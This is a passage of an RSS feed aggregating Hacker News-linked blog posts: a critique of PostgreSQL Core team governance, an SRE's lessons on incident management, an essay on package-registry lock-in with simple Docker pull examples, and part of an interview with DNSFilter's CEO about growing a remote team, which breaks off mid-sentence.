<li>100% of the current Core team members are white men.</li>
<li>All of the Core members are either US or European. No other region is represented.</li>
<li>All but one Core member work for US companies.</li>
</ul>
</li>
<li><strong>Democracy:</strong>
<ul>
<li>Core members are only appointed by existing Core members. In contrast, the “<a href="https://www.postgresql.org/community/recognition/#npos">Recognised Postgres Nonprofit Organisations</a>” (created and enforced by Core) has as a requirement that the “<em>board of directors MUST be elected by the membership</em>”. These rules were, in turn, created by Core itself.</li>
<li>Core members serve for an <em>unlimited</em> term. In contrast, the same Community recognition rules above also require that “<em>Lifetime directorships MUST NOT be allowed</em>”. Four of the current Core members <a href="https://web.archive.org/web/20051023004218/http://www.postgresql.org/developer/bios">have been serving in the Core team for more than 15 years</a>.</li>
</ul>
</li>
<li><strong>Transparency</strong>:
<ul>
<li>The election process, candidate selection, selection criteria, etc are all secret.</li>
<li>Core Team meeting minutes are secret.</li>
<li>Core team policies are enacted by declaration, without involvement of the global community.</li>
</ul>
</li>
</ul>
<p>Facts aside, there are some organizational concerns that may require some further analysis.</p>
<p>In the PostgreSQL distributed community, the <a href="https://www.postgresql.org/developer/core/">Core Team</a> acts as the <em>de facto</em> “central authority” for the project. The <a href="https://www.postgres.ca/">Postgres Association of Canada</a> (“CA”, in short), acts as its legal arm, holding assets (including intellectual property, like domain names and trademarks).</p>
<p>However, this presents an interesting dichotomy: Core makes decisions, but if these require a legal entity to be executed, they are executed by CA. Which has its own board of directors, that needs to approve them. What if they don’t? What if they don’t follow Core? Similarly, how is Core accountable, if it is not backed directly by a legal entity? Because of this, are there any potential liabilities faced directly by their members, as individuals? And what happens if CA’s Board goes haywire?</p>
<p>Other mature and successful open source projects, while distributed as Postgres and built from the contributions of people and organizations all around the world, are nowadays backed by clear and strong legal and organizational structure. Take for example the <a href="https://www.apache.org/foundation/">Apache Foundation</a>, or the <a href="https://www.fsf.org/working-together/fiscal-sponsorship">Free Software Foundation</a>. Or the <a href="https://www.cncf.io/">Cloud Native Computing Foundation (CNCF)</a>, which is a Charter of the Linux Foundation. Its structure <a href="https://www.cncf.io/blog/2019/12/06/cncf-toc-governance-structure-elections-2020/">has three main bodies</a>:</p>
<p>“<em>A <strong>Governing Board (GB)</strong> that is responsible for marketing, budget and other business oversight decisions for the CNCF, a <strong>Technical Oversight Committee (TOC)</strong> that is responsible for defining and maintaining the technical vision, and an <strong>End User Community (EUC)</strong> that is responsible for providing feedback from companies and startups to help improve the overall experience for the cloud native ecosystem</em>”</p>
<p>The <a href="https://www.cncf.io/people/governing-board/">Governing Board has currently 24 members</a>, and their <a href="https://www.cncf.io/about/governing-board-meeting-minutes/">meeting minutes are public</a> (they are not alone: MariaDB Foundation <a href="https://mariadb.org/bodminutes/2020-10-21/">is now publishing their board meetings too</a>); the <a href="https://www.cncf.io/people/technical-oversight-committee/">Technical Committee consists of 11 members and 77 contributors</a>; the <a href="https://docs.google.com/presentation/d/194SyKdHL7ws_DBOdbrXdowEJi54kIzDdDK_h-6Ag0uo/edit#slide=id.g9ffb40d42b_0_161">End User Community has more than 150 companies</a>; furthermore, there are dozens of <a href="https://www.cncf.io/people/ambassadors/">ambassadors</a>; and also dozens of <a href="https://www.cncf.io/people/staff/">staff</a> members. While possibly operating at a different scale than PostgreSQL, they all contribute, in different manners, to the steering, development and vision of the CNCF.</p>
<p>What do you think? <strong>Is PostgreSQL Core today what the PostgreSQL Community needs, or is it time to modernize its processes, structure and governance?</strong> If you think it is the latter, please leave your comments below. I hope this post serves as the starting point for a broader and constructive discussion that can serve as feedback to Core. Let’s ensure the best future for our beloved open source database!</p>

                </div>
                
                    
                
            </div>
        </div>
    </div>
</section></div>]]>
            </description>
            <link>https://postgresql.fund/blog/is-it-time-to-modernize-postgresql-core/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059852</guid>
            <pubDate>Wed, 11 Nov 2020 16:39:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What I Wish I Knew About Incident Management]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25059769">thread link</a>) | @ronaknnathani
<br/>
November 11, 2020 | https://ronaknathani.com/blog/2020/11/what-i-wish-i-knew-about-incident-management/ | <a href="https://web.archive.org/web/*/https://ronaknathani.com/blog/2020/11/what-i-wish-i-knew-about-incident-management/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I gave this talk last year at LinkedIn’s internal SRE conference, thought I’d share it here as well.</p><hr><h2 id="why-i-am-writing-this-post">Why I am writing this post</h2><p>Like every Software Engineer / SRE, I’ve had my share of troubleshooting software. However, I had never been oncall before I joined Linkedin and the impact of a system outage that affects thousands of engineers made the first week of oncall pretty overwhelming.</p><p><img src="https://ronaknathani.com/blog/2020/11/what-i-wish-i-knew-about-incident-management/then-with-caption.gif" alt="first week of me handling production issues"></p><p>But things got better overtime.</p><p>In this post, I would like to share the incident management practices I have picked up over the years as an SRE at Linkedin that help me keep calm under pressure and effectively drive incidents to resolution.</p><p><img src="https://ronaknathani.com/blog/2020/11/what-i-wish-i-knew-about-incident-management/now-with-caption.gif" alt="present me handling production issues"></p><h2 id="what-this-post-is-not-about">What this post is not about</h2><p>In this post, I am not going to talk about how to debug linux or distributed systems or the various debugging tools. (For stories from the frontlines,
<a href="https://ronaknathani.com/#subscribe">stay tuned for a podcast coming soon</a>!)</p><h2 id="first-oncall-week">First oncall week</h2><p>My first few weeks at Linkedin - they were great! I was meeting smart engineers and learning new things. It wasn’t until my first oncall rotation that I started thinking <em>what if there’s an outage and I need to fix it?</em></p><p><img src="https://ronaknathani.com/blog/2020/11/what-i-wish-i-knew-about-incident-management/anxious.gif" alt="anxiety before first week of oncall"></p><p>Now, don’t get me wrong. LinkedIn has really good systems in place for monitoring/alerting, triaging issues and a very well defined process for incident response. Those are absolutely critical. And to prepare, I had shadowed our oncall the week prior and even had an experienced team member shadow me to guide and help me out, but still, I was anxious.</p><p>Here’s what I wish I had known.</p><ul><li><a href="#before-oncall-starts">Before oncall starts</a><ul><li><a href="#oncall-handoff">Oncall handoff</a></li><li><a href="#organizing-slack-during-an-oncall-week">Organizing Slack during an oncall week</a></li></ul></li><li><a href="#signal-vs-noise">Signal vs Noise</a><ul><li><a href="#trust-but-verify---not-all-alerts-are-created-equal">Trust, but verify - not all alerts are created equal</a></li><li><a href="#declaring-an-incident">Declaring an incident</a></li></ul></li><li><a href="#communication-during-an-incident">Communication during an incident</a><ul><li><a href="#the-incident-title-and-scoping-the-impact">The incident title and scoping the impact</a></li><li><a href="#establish-communication-channels-and-an-incident-lead">Establish communication channels and an incident lead</a></li><li><a href="#communicate-changes-to-the-system">Communicate changes to the system</a></li><li><a href="#provide-regular-updates">Provide regular updates</a></li></ul></li><li><a href="#incident-response-is-a-collaborative-process">Incident response is a collaborative process</a><ul><li><a href="#get-help-early">Get help early</a></li><li><a href="#working-with-others">Working with others</a></li><li><a href="#video-conferencing-is-your-friend">Video conferencing is your friend</a></li></ul></li><li><a href="#towards-a-resolution">Towards a resolution</a><ul><li><a href="#looking-at-changes">Looking at changes</a></li><li><a href="#keep-calm-and-carry-on---one-step-at-a-time">Keep calm and carry on - one step at a time</a></li></ul></li><li><a href="#learning-from-the-incident">Learning from the incident</a></li></ul><h2 id="before-oncall-starts">Before Oncall Starts</h2><h3 id="oncall-handoff">Oncall handoff</h3><p>Before an oncall week starts, I talk to the person who is currently oncall to get context on any incidents that happened during the week or any weird bugs that were discovered in our stack. It gives me perspectives on issues that could be getting carried over from the previous week and any critical changes I should be aware of.
Although you can’t plan for all that happens during an oncall week, a proper handoff helps you prepare for it.</p><h3 id="organizing-slack-during-an-oncall-week">Organizing Slack during an oncall week</h3><p>As an SRE on LinkedIn’s container scheduler and deployment infrastructure team, our users are engineers at LinkedIn. We use Slack for internal communication and we have certain channels where users share issues they are experiencing with the tooling or to get our oncall’s attention. During an oncall week, I star these channels and organize my sidebar so that I can easily notice messages from our users and distinguish them from the other messages I receive. As an optional tip - I also like to mute/leave channels that I am not actively participating in to reduce clutter.</p><p>As compared to a normal week, I spend more time on Slack when I am oncall - responding to people, answering support requests, helping users with tooling. These Slack notifications can create a little bit of distraction, however, considering all our users are internal, a rise in messages on our channels can also indicate that something might be wrong with our system and our alerting hasn’t caught it yet.</p><p><img src="https://ronaknathani.com/blog/2020/11/what-i-wish-i-knew-about-incident-management/slack-pings.gif" alt="slack pings during oncall"></p><h2 id="signal-vs-noise">Signal vs Noise</h2><h3 id="trust-but-verify---not-all-alerts-are-created-equal">Trust, but verify - not all alerts are created equal</h3><p><img src="https://ronaknathani.com/blog/2020/11/what-i-wish-i-knew-about-incident-management/trust-but-verify-you-must.jpg" alt="trust-but-verify-you-must"></p><p><i>This is something I learned during my interview at LinkedIn and it has been very applicable in my experience since.</i></p><p>In early days of oncall and incident management, it is very common to feel as if things are on fire when any alert gets triggered. Over time, I have realized that gaining context and verifying that the alert is actually indicating an issue helps with the right next steps. It is important to distinguish signal from noise because:</p><ul><li>An alert could be non-actionable as it was recently configured with a threshold that’s making it too noisy</li><li>The monitoring stack is down and the alert is being triggered because the configuration treats a lack of data points as an issue</li><li>Your service is operating perfectly fine, however, the traffic tier routing requests to your service had an issue</li><li>Timer on a deliberately silenced alert expired and the alert started triggering</li></ul><p>I have experienced all of the above at some point in time. Now when I either receive an alert or a user reports an issue, I check our services (metrics, logs, reproduce the reported problem etc.) to verify that the issue is real.</p><h3 id="declaring-an-incident">Declaring an incident</h3><p>Not all actionable alerts result in an incident. To be effective at identifying the ones that do, it is extremely crucial to think about the bigger picture of mitigating the issue than be overwhelmed by the technical task of resolving the alert.</p><p>Some of the qualitative measures that help make this differentiation is to consider whether an issue requires coordinating the fix with other teams or whether the issue is impacting customers or violating an SLO. If any of the conditions are true, declare an incident. It is always better to declare an incident early in the process than waiting too long.</p><p>At LinkedIn, we have defined guidelines for all teams about what warrants an incident along with different levels of severity. This takes guesswork out of the picture, and provides a shared understanding to every team member.</p><h2 id="communication-during-an-incident">Communication during an incident</h2><h3 id="the-incident-title-and-scoping-the-impact">The incident title and scoping the impact</h3><p>Every incident gets a title. I didn’t realize it initially, but giving an incident a title forces one to define the problem and communicate it to the stakeholders very succinctly. When communicating to stakeholders, <strong>scoping the incident is very important</strong>. What I mean by scoping is identifying how big the impact is - which environment is impacted, is the impact limited to a region or is it global, how many customers are impacted, etc. For instance, “the login feature on the site is not working” vs “the login feature on the site is not working for traffic originating from Asia Pacific” say two very different things.</p><h3 id="establish-communication-channels-and-an-incident-lead">Establish communication channels and an incident lead</h3><p>We heavily rely on Slack to communicate during an incident. A dedicated slack channel helps focus all the energy and inputs from everyone in one place. It helps the incident lead collect data about symptoms that the users are experiencing and also captures a log of considered/discarded hypotheses and any changes made to the system. Once the Slack channel is created, establish an incident lead and let everyone know who is driving the incident forward.</p><p>Eslablishing explicit comms channels for reporting and identifying issues and establishing an incident lead reduce the delay in action and disambiguate any confusion.</p><h3 id="communicate-changes-to-the-system">Communicate changes to the system</h3><p>If there’s a fix you’d like to try out, let others know who are and encourage everyone to do the same. This ensures that the potential fix doesn’t make an already bad situation worse and helps catch any blind spots early. If you do end up making a change to the system after getting consensus, let others know and follow up on its effects.</p><h3 id="provide-regular-updates">Provide regular updates</h3><p>While working towards a resolution for the incident, it is very easy to get overwhelmed by the technical details and miss to communicate an update. This leads to angry leadership and annoyed customers who have no insight into what’s happening.</p><p>An update provides visibility to the customers that the issue is being worked upon and lets the leadership identify if they can help out with anything. Depending on the severity of the incident, an update every 15-30 mins serves pretty well. The update doesn’t have to be extremely detailed, rather a brief summary describing the current state and immediate next steps is sufficient. An example update:</p><blockquote><p><strong>[UPDATE]</strong> Our hypothesis about the memory leak checks out and we have validated the fix in the staging environment. We have pushed out the change and as soon as it goes through the CI pipeline, we’ll canary the new release, monitor metrics and promote the change after verifying the fix.</p></blockquote><h2 id="incident-response-is-a-collaborative-process">Incident response is a collaborative process</h2><h3 id="get-help-early">Get help early</h3><p>In my earlier days, I used to think that it was solely my responsibility to mitigate the issue, find the root cause, and roll out the fix. If I couldn’t do it, it wouldn’t reflect well on me. In reality, incident management, like much of software development, is a very collaborative process.</p><p>One of the big differences in how I approach it now is I focus on actively pulling in other engineers who could help with debugging or resolving the issue early in the process. This change in perspective has relieved me of a lot of unnecessary stress and also made me more effective at resolving incidents.</p><p>When requesting help, be specific about the task as well as the urgency. It helps others calibrate their response and manage things they might have at hand.</p><h3 id="working-with-others">Working with others</h3><p>One of the most important things while handling incidents is working with others. Considering the multi-faceted nature of an SRE role, it’s one of the most important while underrated skills.</p><p>With multiple people involved, various possibilities get shared and one of the responsibilities of the incident lead is to guide these discussions in a productive direction while filtering out the noise. One should be cautious about going down any rabbit holes and focus on stopping the bleeding first. If there’s a probable cause, share it early - it helps rule out possibilities. And it’s okay to ask questions that seem obvious, but specific questions are more helpful.</p><p>Being fearlessly curious, and keeping an open mind enables one to consider possibilities that could be overseen otherwise. Remember, you are working together as a team on sharing and ruling out hypotheses to solve a challenging problem.</p><h3 id="video-conferencing-is-your-friend">Video Conferencing is your friend</h3><p>We work …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ronaknathani.com/blog/2020/11/what-i-wish-i-knew-about-incident-management/">https://ronaknathani.com/blog/2020/11/what-i-wish-i-knew-about-incident-management/</a></em></p>]]>
            </description>
            <link>https://ronaknathani.com/blog/2020/11/what-i-wish-i-knew-about-incident-management/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059769</guid>
            <pubDate>Wed, 11 Nov 2020 16:33:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Are Package Registries Holding Open-Source Hostage?]]>
            </title>
            <description>
<![CDATA[
Score 91 | Comments 75 (<a href="https://news.ycombinator.com/item?id=25059755">thread link</a>) | @aviaviavi
<br/>
November 11, 2020 | https://about.scarf.sh/post/package-registries-and-open-source | <a href="https://web.archive.org/web/*/https://about.scarf.sh/post/package-registries-and-open-source">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>A few days ago, I received an email from Docker about a change I already knew was coming:<em>‍</em></p><blockquote><em>Docker will begin enforcing rate limits on container pulls for Anonymous and Free users.</em><br></blockquote><p>To many, this came as no surprise. For years, <a href="http://hub.docker.com/">Docker Hub</a> has offered free hosting of container images, which typically range in size from a few megabytes to many gigabytes. Docker workflows as a result use a <em>lot</em> of bandwidth, and that bandwidth costs money.<br></p><p>Should we OSS (open-source software)&nbsp;developers have to think about the business and financial models of the platforms we host our software on? In a perfect world, we wouldn't have to—but in the real world we very much do. The incentives between OSS maintainers and the registries they use are often misaligned.&nbsp;<br></p><p>Docker Hub, <a href="http://npmjs.com/">npm</a>, and other comparable registries are incentivized to create lock-in, even if it makes the product experience worse for their users and customers. This is especially true of the for-profit companies behind the registries, but we see similar issues from many of the not-for-profit registries. </p><p>Maintainers, on the other hand, are incentivized to choose the best product for their needs at the lowest cost, which depends on being able to switch providers when a better service comes on the market.&nbsp;<br></p><p>This situation is fundamentally at odds with the today's package management ecosystem, where immutability is paramount in order to achieve stability. We avoid breaking things at all costs, on principle, since OSS packages are the nuts and bolts of the software ecosystem, the internet, and thus society itself.<br></p><h6><strong>Mechanics of registry lock-in</strong><br></h6><p>The registry where you host your packages and containers might be free today, but if that changes later, as is the case now with Docker, you and your users might be stuck paying whatever price the vendor chooses to set. Your users might even agree to access your package without the rate limit, but<strong> </strong><em>you</em> will not be seeing any of that revenue. Access to your open-source software was effectively just sold for a profit, and you, the author of that software, were cut out of the transaction.<br></p><p>While you could in theory just host your software somewhere else, can you really do that without breaking things for your current users? If you maintain and distribute a popular Docker image, switching the package registry is likely difficult.<br></p><p>Currently, any image on Docker Hub is installable as:<br></p><div><pre><code>$ docker run org-name/image-name</code></pre></div><p><em>‍</em>If you decide later you actually want to move your container hosting somewhere else - let's say <a href="https://cloud.google.com/container-registry" target="_blank">Google Container Registry</a> for this example - the Docker client is reasonable and lets you pull down images by their URL:<br></p><div><pre><code>$ docker run gcr.io/org-name/image-name</code></pre></div><p><em>‍</em>The problem here is that once you've changed the URL to your images, all of your existing users will stop getting updates! Even worse, this can break builds or pipelines for your users whenever they hit the new rate limits, which are not under your control. </p><p>At the point where your container has a sizable user-base all going through one of the existing container registries, your lock-in is substantial. Moving platforms will be painful. The crux of the problem here is that <em>you</em> don't own the distribution channel. The registry is the&nbsp; first place the web traffic goes, and everything that happens after that is at <em>the registry vendor’s</em><strong> </strong>discretion and to their advantage, not yours.<br></p><h6><strong>Effects of registry lock-in</strong><br></h6><p>Some might respond: <em>"This still seems like more of a theoretical problem than a practical one."</em><br></p><p>There are several practical downstream effects of the misaligned incentive structures to open-source package hosting. One major effect of registry lock-in is that maintainers cannot access their usage data. The data that registries naturally collect from package downloads can be quite useful to maintainers in a myriad of ways, yet registries typically don't share anything beyond a download count. </p><p>Registries know where the downloads are coming from, the devices, the package versions, which other packages are installed alongside, and a whole lot more. Little to none that information is shared with maintainers. Thus, maintainers are effectively locked out from observing the usage traffic.&nbsp;<br></p><p>Why is this the case? It's not because developers don't ask for it (<a href="https://github.com/npm/npm/issues/279">https://github.com/npm/npm/issues/279</a>). It's because the registries have no incentive to do so. It would cost the registries money to build and maintain the features to provide this data. Some registries even claim that exposing this data publicly would incentivize maintainers to game the system. Meanwhile, the extreme levels of inertia in software distribution keep maintainers locked in. </p><p>The registries' demonstrated distrust of maintainers seems counterproductive in a space where there's opportunity to work together cooperatively. If registry incentives were aligned accordingly, a registry like npm, for instance, would be in a great position to empower maintainers to leverage their own distribution data to deliver the best software possible.<br></p><p>What makes npm’s particular scenario even worse is that they've made it so difficult to use a registry that is<em> not</em> npm. There's no way to pull a single package from an alternate registry without switching to that registry. Which makes it quite impossible to actually publish a widely used JavaScript package without putting it on npm.&nbsp;<br></p><p>Contrast this scenario to Docker: Docker Hub creates different tradeoffs that both help and harm OSS maintainers. They've loosened their grip on OSS maintainers by making it user-friendly to pull containers down from alternative registries besides Docker Hub. However, even if you switch away from Docker Hub, you're still jumping from one company to another. This is because, at the end of the day, the registries—not the maintainers—own the distribution URL. The power imbalance continues.<br></p><p>My argument is not intended to dismiss the efforts of the registries as a whole. Package registries serve an essential role in software distribution, and have collectively serviced billions upon billions of package downloads. They’ve made it easy for anyone in the world to interact with open-source, and as a result have helped push open-source forward. Astonishingly, they have, for most part, remained free to use! But as software continues to eat the world and the distribution of that software becomes more important, conflicting interests in this space become increasingly problematic.<br></p><h6><strong>Looking forward</strong><br></h6><p>How do we solve this? Ultimately, package registries need to align their incentives with those of maintainers. Registries should build products maintainers <em>want</em> to use rather than products they <em>have</em> to use.&nbsp;The entire OSS&nbsp;community can benefit. <br></p><p>Part of this means registries must be more intentional about giving maintainers back control over the distribution of their own software, even when it means the maintainers could take their packages elsewhere. As a community, we should be empowering maintainers to do their best work rather than constraining them to work within a specific&nbsp; platform or framework.&nbsp;<br></p><p>For the health of the open source ecosystem, it's critical to ensure that maintainers are not locked out from accessing the data about their own software distribution. Maintainers must be able to make data-informed decisions and treat distribution data as something that rightfully belongs to them, instead of just the registry providers.<br></p><p>Unfortunately, the current software distribution model works to cut maintainers out, making all downstream actions more difficult and strictly less informed. When we as a community decide to better align ourselves with open-source maintainers and build platforms to empower them, the result will be better software for the entire ecosystem.</p><p>Scarf is working on new tooling to address these problems, so stay tuned! Follow <a href="https://twitter.com/scarf_oss" target="_blank">@scarf_oss</a> on Twitter or subscribe below for periodic updates.<br></p></div></div></div></div>]]>
            </description>
            <link>https://about.scarf.sh/post/package-registries-and-open-source</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059755</guid>
            <pubDate>Wed, 11 Nov 2020 16:32:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lessons learned from growing a distributed team from 2 to 30 in under 1 year]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25059715">thread link</a>) | @Riphyak
<br/>
November 11, 2020 | https://youteam.io/blog/dnsfilter-interview/ | <a href="https://web.archive.org/web/*/https://youteam.io/blog/dnsfilter-interview/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><figure id="attachment_11160" aria-describedby="caption-attachment-11160"><a href="https://youteam.io/blog/wp-content/uploads/2020/10/Ken-min-scaled.jpg" data-size="{&quot;w&quot;:1920,&quot;h&quot;:1280}"><img loading="lazy" src="https://youteam.io/blog/wp-content/uploads/2020/10/Ken-min-300x274.jpg" alt="" width="300" height="274" srcset="https://youteam.io/blog/wp-content/uploads/2020/10/Ken-min-300x274.jpg 300w, https://youteam.io/blog/wp-content/uploads/2020/10/Ken-min-1024x934.jpg 1024w, https://youteam.io/blog/wp-content/uploads/2020/10/Ken-min-768x700.jpg 768w, https://youteam.io/blog/wp-content/uploads/2020/10/Ken-min-1536x1400.jpg 1536w, https://youteam.io/blog/wp-content/uploads/2020/10/Ken-min-2048x1867.jpg 2048w, https://youteam.io/blog/wp-content/uploads/2020/10/Ken-min-716x653.jpg 716w, https://youteam.io/blog/wp-content/uploads/2020/10/Ken-min-820x748.jpg 820w" sizes="(max-width: 300px) 100vw, 300px"></a><figcaption id="caption-attachment-11160">Ken Carnesi, DNSFilter CEO</figcaption></figure><p><span>Ken Carnesi, Mike Schroll, and Brian Gillis started <a href="https://dnsfilter.com/" target="_blank" rel="noopener">DNSFilter</a> after Ken struggled to find a content filtering solution that fit the needs of his business. Rather than settle for a solution that wasn’t ideal, they created their own. DNSFilter provides user-friendly DNS security to protect entire organizations from online security threats and undesirable content. Their software is backed by powerful artificial intelligence and an industry-leading global anycast network for fast <span>DNS</span>&nbsp;resolution and real-time detection.</span></p><p><span>In the interview with YouTeam’s co-CEO Yurij Riphyak, Ken Carnesi, CEO of DNSFilter, tells about the journey of their remote team, opens insights about remote company culture maintenance, shares tips on hiring remotely, and addresses to the main pains of distributed teams.</span></p><p><strong><em>Yurij Riphyak: To start, can you tell me about the beginnings of your company? And how did you arrive at the idea of operating remotely?</em></strong></p><p><b>Ken Carnesi: </b><span>Sure. So basically, DNSFilter essentially protects employees on the Internet from going to sites that may be inappropriate or malicious, whether that be content-wise for adult content or social media, or our primary focus area, which is phishing attacks or anything that’s going to affect your device or cause trouble. </span></p><p><span>Speaking about where it got started, back in 2007, I founded a wireless ISP while I was in school in Boston. I grew that company, and it got to the point where we had to start doing more and more governmental projects like naval hospitals, military bases, and things like that. And as we deployed these large-scale Wi-Fi networks, particularly for the government, we had this requirement to have content filtering to keep people from going to those inappropriate sites. I had started out using a product called OpenDNS, and I really loved it. But then, one day, they just began raising the prices to the point where it would make a lot of my contracts with the government unprofitable because we were giving them a really good deal. So I couldn’t stick with OpenDNS, and I soon left them as a customer. </span></p><p><span>I searched for other solutions but I actually thought that OpenDNS did a great job and there wasn’t anybody out there that I thought made a better product. This is where the idea started floating around in my head that maybe I should try making my own product as a replacement. Then one day, I think it was in the summer of 2015, I saw an article that OpenDNS was sold to Cisco for $500 or $600 million. And I was like, wow, that’s a way bigger opportunity than I thought there was, and there’s probably going to be a lot of other customers that are sort of left behind like I was or unhappy because of the acquisition. There’s this opinion that when companies get acquired by Cisco, that’s where the products go to die. So that was the kick in the pants to get it done. </span></p><p><span>At that time, I had been mentoring at a tech incubator in South Carolina, which is where I ended up acquiring another wireless ISP. I also met my co-founder who was at that tech incubator, too, and we started exploring the idea together. He had been a white-hat hacker doing pen testing for Fortune 100 companies and also had started a hosting company that he exited before we met. He already knew a lot about the infrastructure. I used funds from my wireless ISP&nbsp; to pre-purchase several years of service from DNSFilter and build out the MVP. Then, we did the alpha testing on about 150 of my networks, and after that, we started bringing in other people from the ISP industry who operated similar companies and got them to try it out, and sort of took it from there. That’s how it got started.&nbsp;</span></p><figure id="attachment_11158" aria-describedby="caption-attachment-11158"><a href="https://youteam.io/blog/wp-content/uploads/2020/10/dnsfilter-team-min.jpg" data-size="{&quot;w&quot;:500,&quot;h&quot;:347}"><img loading="lazy" src="https://youteam.io/blog/wp-content/uploads/2020/10/dnsfilter-team-min.jpg" alt="Three founders of DNSFilter (Ken, Mike, Brian)" width="500" height="347" srcset="https://youteam.io/blog/wp-content/uploads/2020/10/dnsfilter-team-min.jpg 500w, https://youteam.io/blog/wp-content/uploads/2020/10/dnsfilter-team-min-300x208.jpg 300w" sizes="(max-width: 500px) 100vw, 500px"></a><figcaption id="caption-attachment-11158">Founders of DNSFilter. From left to right: Ken Carnesi, Mike Schroll, and Brian Gillis.</figcaption></figure><p><span>Speaking about why we got started to be remote in the first place, it wasn’t something that we actually set out to do. It was more of a necessity for us for two reasons. So, number one was that we ended up bringing on a third co-founder, who lived in New York, and we lived in South Carolina. Our third co-founder was our first sort of remote employee. The other problem was that we had limited funds, and we hadn’t yet gone through a round of funding. At that time, this was still a side job for us, and we weren’t going to move to the same location for a company that didn’t have funding yet.</span></p><p><span>Plus, to compound the problem, being in Myrtle Beach, South Carolina, we didn’t have access to the talent pool, especially in the technology space that we needed. We had no option but to look elsewhere. I think our first hire was from the Czech Republic. It was somebody who used to work at OpenDNS as a support person. Then, our second hire was from Colombia. And now we’re up to about 30 people. We’ll be close to 40 people by about the end of September, with plans to go well beyond that in the next six months. So our employees are all over the place — South America, the US, and Europe.</span></p><p><strong><em>Yurij Riphyak: Are all your employees working from home, or do you have some of them co-located in certain places?</em></strong></p><p><b>Ken Carnesi: </b><span>That’s a good question. Technically, we have two offices. One is in DC, but that’s really just me and a few others. The largest office we have is in Denver, Colorado, where our sales team is. It’s a small team at the moment, but that’s the one exception that we might actually try to keep from being remote.</span></p><p><span>I guess the feeling that I learned early on was a couple of years ago when we surpassed the 1 million a year in revenue mark. And that was a big deal for us back then. I came into the office at 10 o’clock in the morning with a bottle of champagne, and I’m like, “Alright! We’re gonna pop this bottle and kill it and celebrate!” And it was super sad, you know, there was just me and one other person drinking in a small room at 10:30 in the morning with some other people in Zoom completely not on the same page.</span></p><p><span>I realized that salespeople, though, are competitive, and they like to celebrate. They have the camaraderie, and they cheer up and help each other. So we’re trying to keep the sales part of the organization in one place.</span></p><figure id="attachment_11159" aria-describedby="caption-attachment-11159"><a href="https://youteam.io/blog/wp-content/uploads/2020/10/Image-from-iOS-4-1-min-scaled.jpg" data-size="{&quot;w&quot;:1920,&quot;h&quot;:1280}"><img loading="lazy" src="https://youteam.io/blog/wp-content/uploads/2020/10/Image-from-iOS-4-1-min-scaled.jpg" alt="DNSFilter at RSAConference" width="650" height="488" srcset="https://youteam.io/blog/wp-content/uploads/2020/10/Image-from-iOS-4-1-min-scaled.jpg 2560w, https://youteam.io/blog/wp-content/uploads/2020/10/Image-from-iOS-4-1-min-300x225.jpg 300w, https://youteam.io/blog/wp-content/uploads/2020/10/Image-from-iOS-4-1-min-1024x768.jpg 1024w, https://youteam.io/blog/wp-content/uploads/2020/10/Image-from-iOS-4-1-min-768x576.jpg 768w, https://youteam.io/blog/wp-content/uploads/2020/10/Image-from-iOS-4-1-min-1536x1152.jpg 1536w, https://youteam.io/blog/wp-content/uploads/2020/10/Image-from-iOS-4-1-min-2048x1536.jpg 2048w, https://youteam.io/blog/wp-content/uploads/2020/10/Image-from-iOS-4-1-min-716x537.jpg 716w, https://youteam.io/blog/wp-content/uploads/2020/10/Image-from-iOS-4-1-min-820x615.jpg 820w" sizes="(max-width: 650px) 100vw, 650px"></a><figcaption id="caption-attachment-11159">DNSFilter at RSAConference right before all conferences went digital. From right to left: Josh (Marketing Director), Rafael (DevOps Engineer), Ken (CEO), and a customer of DNSFilter.</figcaption></figure><p><strong><em>Yurij Riphyak: I’ve just been to Denver. It’s a lovely place. I think more and more companies should think about moving to a location like that, especially now there is this massive exodus from California because of the prices and taxes.&nbsp;</em></strong></p><p><strong><em>Moving back to DNSFilter, let’s talk a little bit about hiring remote employees. What is your usual process? Do you rely on external recruiters or source people yourself? Do you use any online tools for that? Because for many companies, it feels like a challenge to hire remotely without actually meeting a person.</em></strong></p><p><b>Ken Carnesi: </b><span>Actually, it’s now come to the point where I think it’s the opposite for us. For example, it was harder to find the office manager because they had to be in DC, and this was sort of a limitation for us. But how we do hiring really depends on the position. The only positions we ever tried with an external recruiter were sales positions, and it worked out one time out of four. The best thing for us has been to find them on our own. If they do have experience in sales for even less than a year, it doesn’t matter. What they were selling is also not as important as the spirit we’re looking for and a good culture fit and drive. I mean we have people like our sales manager who used to work at Zillow, which is completely different compared to what we do. So, yeah, their past experience doesn’t really matter as long as they’re a great fit and performing well.&nbsp;</span></p><p><span>When it comes to tech positions, though, that is a little different. I think we’ve done a really good job in hiring good people in the tech field, whether they were developers or DevOps people. The key to success for us turned out to be going to industry-specific locations — a DevOps or developer forum or Slack channel or something like that. We’re not finding them on Indeed or Monster.com, it’s always going to be some underground type of network. </span></p><p><span>If it’s the support people, we’ve had positive experiences going to places like Reddit. Even Reddit can be a good source because they have forums and subreddits for various industries. For example, we sell to MSPs, managed service providers, and their outsourced IT companies are generally our customers. So when we need a support person, we go to the Reddit channel for people who worked at MSPs and are leaving or lost their job or looking for a new job. They understand who our customer is, and that’s been a good practice to find the right people so far. </span></p><p><span>We also try to incentivize the employees to recruit for us as well. While we’re getting to the point where we probably will have an in-house recruiter soon, we’d still rather give a few thousand dollars to an employee if they can bring us somebody who they can vouch for. Somebody they already know is a good culture fit. For a 30 person company, we’ve probably brought in around 25% from referrals.&nbsp;</span></p><p><span>And to be honest, we’ve never lost anybody. We had to let people go for a performance issue or something like that, but we’ve never had any issues with the people who were brought on through referrals from employees who were already doing well here. So that’s been a good one. </span></p><p><span>Speaking of tools, though, we rely the most on a tool called </span><a href="https://breezy.hr/"><span>Breezy</span></a><span>. We also tried a couple of remote work platforms and 